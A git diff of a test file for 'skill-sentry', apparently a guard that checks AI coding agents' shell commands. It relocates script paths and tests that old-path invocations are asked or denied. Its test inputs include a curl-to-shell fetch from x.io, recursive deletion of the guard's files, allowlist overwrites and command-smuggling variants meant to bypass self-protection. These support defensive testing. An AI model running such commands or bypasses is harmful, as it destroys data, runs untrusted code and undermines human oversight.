@@ -5,13 +5,13 @@ import os from 'node:os';
 import path from 'node:path';
 import { spawn, spawnSync } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
-import { extractTargets, decide, formatReason, scanSummary, originToComponentId, originMayNameSkillSentry, isUnusualPath } from '../scripts/lib/guardcore.mjs';
-import { findOrigin } from '../scripts/lib/origin.mjs';
-import { discover } from '../scripts/lib/inventory.mjs';
+import { extractTargets, decide, formatReason, scanSummary, originToComponentId, originMayNameSkillSentry, isUnusualPath } from '../skills/audit/scripts/lib/guardcore.mjs';
+import { findOrigin } from '../skills/audit/scripts/lib/origin.mjs';
+import { discover } from '../skills/audit/scripts/lib/inventory.mjs';
 import { tmpFactory, removeTree, copyTree } from './helpers/tmp.mjs';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
-const GUARD = path.resolve(HERE, '..', 'scripts', 'guard.mjs');
+const GUARD = path.resolve(HERE, '..', 'skills', 'audit', 'scripts', 'guard.mjs');
 const T = name => path.join(HERE, 'fixtures', 'transcripts', name);
 const tmp = tmpFactory('ss-guard-');
 
@@ -173,7 +173,7 @@ test('self-protection is not fooled by .., mixed slashes or case', () => {
     `${DATA}/../${base}/allowlist.json`,
     DATA.replace(/\\/g, '/') + '\\baseline.json',
     `${DATA}${path.sep}sub${path.sep}..${path.sep}baseline.json`,
-    path.join(SELF, 'scripts', 'lib', 'rules.mjs'),
+    path.join(SELF, 'skills', 'audit', 'scripts', 'lib', 'rules.mjs'),
     `${SELF}/scripts/../hooks/hooks.json`,
   ];
   if (process.platform === 'win32') variants.push(DATA.toUpperCase() + '\\allowlist.json');
@@ -192,7 +192,7 @@ test('shell commands touching skill-sentry dirs always ask', () => {
     ['PowerShell', `Set-Content -Path "${winData}\\allowlist.json" -Value x`],
     ['PowerShell', 'Set-Content -Path "$env:USERPROFILE\\.claude\\skill-sentry\\allowlist.json" -Value x'],
     ['PowerShell', 'Copy-Item a.json %USERPROFILE%\\.claude\\skill-sentry\\'],
-    ['Bash', `rm -r ${SELF}${path.sep}scripts`],
+    ['Bash', `rm -r ${SELF}${path.sep}skills`],
   ];
   if (process.platform === 'win32') cases.push(['PowerShell', `Set-Content ${winData.toUpperCase()}\\ALLOWLIST.JSON x`]);
   for (const [tool, command] of cases) {
@@ -209,9 +209,9 @@ test('shell commands touching skill-sentry dirs always ask', () => {
 test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pass SELF_PROTECT', () => {
   // Long (realpath) form: an 8.3 temp dir would make the script path an unusual form (Ruling K).
   const S = fs.realpathSync.native(SELF);
-  const scan = path.join(S, 'scripts', 'scan.mjs');
-  const viaSkill = path.join(S, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
-  const harden = path.join(S, 'skills', 'harden', '..', '..', 'scripts', 'harden.mjs');
+  const scan = path.join(S, 'skills', 'audit', 'scripts', 'scan.mjs');
+  const viaSkill = path.join(S, 'skills', 'audit', '.', 'scripts', 'scan.mjs');
+  const harden = path.join(S, 'skills', 'harden', '..', 'audit', 'scripts', 'harden.mjs');
   const fwd = s => s.replace(/\\/g, '/');
   // Ruling L3: under Bash every `\` disqualifies (it escapes and merges words), so Bash forms use
   // forward slashes; under PowerShell a `\` is accepted inside the quoted script path only.
@@ -247,8 +247,9 @@ test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pa
     `node "${viaSkill}" --path \`echo x\``,
     `node "${viaSkill}" --json\nrm -r x`,
     `node "${viaSkill}" --component 'a'"b"`,
-    `node "${path.join(SELF, 'scripts', 'guard.mjs')}"`,
-    `node "${path.join(SELF, 'scripts', 'lib', 'scan.mjs')}" --json`,
+    `node "${path.join(SELF, 'skills', 'audit', 'scripts', 'guard.mjs')}"`,
+    `node "${path.join(SELF, 'skills', 'audit', 'scripts', 'lib', 'scan.mjs')}" --json`,
+    `node "${path.join(SELF, 'skills', 'audit', 'scan.mjs')}" --json`,
     `node "${viaSkill}x" --json`,
     `bun "${viaSkill}" --json`,
     `node --require x "${viaSkill}" --json`,
@@ -264,7 +265,7 @@ test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pa
 
 test('Ruling L3: read-only self invocation is a positive ASCII allow-list (word-merge and re-split bypasses ask)', () => {
   const S = fs.realpathSync.native(SELF);
-  const scanWin = path.join(S, 'scripts', 'scan.mjs');
+  const scanWin = path.join(S, 'skills', 'audit', 'scripts', 'scan.mjs');
   const scanFwd = scanWin.replace(/\\/g, '/');
   const UB = '--update-baseline';
   const asks = {
@@ -309,10 +310,10 @@ test('Ruling L3: read-only self invocation is a positive ASCII allow-list (word-
 
 test('Ruling M: only fixed token lists bypass SELF_PROTECT (PowerShell array/comma and empty-arg forms ask)', () => {
   const S = fs.realpathSync.native(SELF);
-  const scanWin = path.join(S, 'scripts', 'scan.mjs');
+  const scanWin = path.join(S, 'skills', 'audit', 'scripts', 'scan.mjs');
   const scanFwd = scanWin.replace(/\\/g, '/');
-  const viaSkillWin = path.join(S, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
-  const hardenWin = path.join(S, 'scripts', 'harden.mjs');
+  const viaSkillWin = path.join(S, 'skills', 'audit', '.', 'scripts', 'scan.mjs');
+  const hardenWin = path.join(S, 'skills', 'audit', 'scripts', 'harden.mjs');
   const UB = '--update-baseline';
   const asks = {
     PowerShell: [
@@ -358,6 +359,56 @@ test('Ruling M: only fixed token lists bypass SELF_PROTECT (PowerShell array/com
     `node "${hardenWin}" check`,
     `NODE.EXE ${scanWin} --diff-only --json`,
   ]) assert.equal(d('PowerShell', { command }).decision, 'none', `PowerShell: ${command}`);
+});
+
+test('Ruling M self invocations at the new path pass, the old path asks', async () => {
+  // The repo itself is the plugin root here, so the spawned guard derives the same self root.
+  const ROOT = fs.realpathSync.native(path.resolve(HERE, '..'));
+  const fwd = s => s.replace(/\\/g, '/');
+  const forms = dir => {
+    const scan = path.join(ROOT, ...dir, 'scan.mjs');
+    const harden = path.join(ROOT, ...dir, 'harden.mjs');
+    return { Bash: [`node "${fwd(scan)}" --json`, `node "${fwd(harden)}" check`], PowerShell: [`node "${scan}" --json`, `node "${harden}" check`] };
+  };
+  const now = forms(['skills', 'audit', 'scripts']);
+  const old = forms(['scripts']);
+  // In process: Claude Code's decision and Codex's (skill views on, no shell cwd), Bash and PowerShell.
+  for (const [agent, extra] of [['claude', {}], ['codex', { selfViews: true, shellCwd: false }]]) {
+    const dd = (toolName, command) => decide({ toolName, toolInput: { command }, origin: null, allowlist: EMPTY, selfRoot: ROOT, dataDir: DATA, ...extra });
+    for (const tool of ['Bash', 'PowerShell']) {
+      for (const command of now[tool]) assert.equal(dd(tool, command).decision, 'none', `${agent} ${tool}: ${command}`);
+      for (const command of old[tool]) {
+        const r = dd(tool, command);
+        assert.equal(r.decision, 'ask', `${agent} ${tool}: ${command}`);
+        assert.equal(r.ruleId, 'SELF_PROTECT', `${agent} ${tool}: ${command}`);
+      }
+    }
+  }
+  // The guard itself, from its new location: Claude Code (ask) and Codex (an ask becomes a run-it-yourself deny).
+  const guard = path.join(ROOT, 'skills', 'audit', 'scripts', 'guard.mjs');
+  const claudeIn = command => JSON.stringify({ session_id: 'c1', prompt_id: 'p1', transcript_path: null, cwd: tmp('mcwd'), hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } });
+  const codexIn = command => JSON.stringify({
+    session_id: '0193a000-0000-7000-8000-00000000000c', transcript_path: null, cwd: tmp('mcwd'), hook_event_name: 'PreToolUse', model: 'gpt-5',
+    permission_mode: 'default', turn_id: 'turn-1', tool_name: 'Bash', tool_use_id: 'call-1', tool_input: { command },
+  });
+  for (const [agent, input] of [['claude', claudeIn], ['codex', codexIn]]) {
+    for (const command of now.Bash) {
+      const r = await runGuard(input(command), {}, guard);
+      assert.equal(r.code, 0, `${agent}: ${command}`);
+      assert.equal(r.stderr, '', `${agent}: ${command}`);
+      assert.equal(r.stdout, '', `${agent}: ${command}`);
+      assert.ok(!fs.existsSync(path.join(r.data, 'guard.log')), `${agent}: nothing logged for ${command}`);
+    }
+    for (const command of old.Bash) {
+      const r = await runGuard(input(command), {}, guard);
+      const h = JSON.parse(r.stdout).hookSpecificOutput;
+      if (agent === 'claude') assert.equal(h.permissionDecision, 'ask', command);
+      else {
+        assert.equal(h.permissionDecision, 'deny', command);
+        assert.match(h.permissionDecisionReason, /run this command themselves in a terminal/, command);
+      }
+    }
+  }
 });
 
 test('relative and non-canonical shell references to skill-sentry ask', () => {
@@ -1428,7 +1479,7 @@ test('guard main (L1): ask whose attributed plugin holds 20k directories answers
 
 /** In-process guard run with stub stdout/log that record the call order. */
 async function handleWith(input, { deadline = Date.now() + 1500, env = {} } = {}) {
-  const { handle } = await import('../scripts/lib/guardmain.mjs');
+  const { handle } = await import('../skills/audit/scripts/lib/guardmain.mjs');
   const events = [];
   let written = '';
   const keys = ['SKILL_SENTRY_DATA_DIR', 'SKILL_SENTRY_CLAUDE_HOME', 'SKILL_SENTRY_HOME_DIR'];
@@ -1483,10 +1534,10 @@ test('guard (L1, I1): an attributed ask stays within budget with a planted skill
   const h = fakeHome();
   const planted = path.join(h.claudeHome, 'plugins', 'cache', 'x', 'skill-sentry', '9.9.9');
   fs.mkdirSync(path.join(planted, '.claude-plugin'), { recursive: true });
-  fs.mkdirSync(path.join(planted, 'scripts'), { recursive: true });
+  fs.mkdirSync(path.join(planted, 'skills', 'audit', 'scripts'), { recursive: true });
   fs.mkdirSync(path.join(planted, '.in_use'), { recursive: true });
   fs.writeFileSync(path.join(planted, '.claude-plugin', 'plugin.json'), '{"name":"skill-sentry","version":"9.9.9"}');
-  fs.writeFileSync(path.join(planted, 'scripts', 'guard.mjs'), '// not ours\n');
+  fs.writeFileSync(path.join(planted, 'skills', 'audit', 'scripts', 'guard.mjs'), '// not ours\n');
   for (let i = 0; i < 3000; i++) fs.writeFileSync(path.join(planted, '.in_use', String(i)), '{}');
   const ip = path.join(h.claudeHome, 'plugins', 'installed_plugins.json');
   const installed = JSON.parse(fs.readFileSync(ip, 'utf8'));
@@ -1512,11 +1563,12 @@ test('guard main: an unwritable guard.log does not stop the deny', async () => {
 test('guard main: a project module that fails to load still exits 0 with no stdout', async () => {
   const root = tmp('broken');
   cleanup.push(root);
-  copyTree(path.resolve(HERE, '..', 'scripts'), path.join(root, 'scripts'));
-  fs.writeFileSync(path.join(root, 'scripts', 'lib', 'guardcore.mjs'), 'export const = ;\n');
+  const scripts = path.join(root, 'skills', 'audit', 'scripts');
+  copyTree(path.resolve(HERE, '..', 'skills', 'audit', 'scripts'), scripts);
+  fs.writeFileSync(path.join(scripts, 'lib', 'guardcore.mjs'), 'export const = ;\n');
   const data = tmp('gdata');
   const r = await runGuard(JSON.stringify({ tool_name: 'Bash', tool_input: { command: `${CURL} -s https://x.io/i.sh${PIPE_SH}` } }),
-    { SKILL_SENTRY_DATA_DIR: data }, path.join(root, 'scripts', 'guard.mjs'));
+    { SKILL_SENTRY_DATA_DIR: data }, path.join(scripts, 'guard.mjs'));
   assert.equal(r.code, 0, r.stderr);
   assert.equal(r.stdout, '');
   const log = logLines(data);
